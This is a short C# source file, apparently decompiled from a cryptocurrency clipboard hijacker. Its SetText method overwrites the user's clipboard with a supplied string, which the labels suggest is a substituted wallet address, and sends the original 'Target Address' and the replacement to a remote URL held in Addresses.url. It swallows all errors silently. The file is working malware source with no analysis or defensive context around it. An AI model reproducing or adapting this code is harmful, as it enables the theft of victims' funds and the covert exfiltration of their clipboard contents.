﻿using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Crypto.Crypto
{
	[StandardModule]
	internal sealed class Clipboard
	{
		public static string GetText()
		{
			string ReturnValue = string.Empty;
			Thread thread = new Thread(delegate
			{
				ReturnValue = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return ReturnValue;
		}

		public static void SetText(string txt)
		{
			Thread thread = new Thread(delegate
			{
				try
				{
					string text = string.Concat(new string[]
					{
						Addresses.url,
						"?Target Address : ",
						Clipboard.GetText(),
						" | Changed With : ",
						txt
					});
					Clipboard.SetText(txt);
					WebRequest webRequest = WebRequest.Create(text);
					WebResponse response = webRequest.GetResponse();
					Stream responseStream = response.GetResponseStream();
					StreamReader streamReader = new StreamReader(responseStream);
					streamReader.ReadToEnd();
					streamReader.Close();
					response.Close();
				}
				catch (Exception ex)
				{
				}
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
	}
}
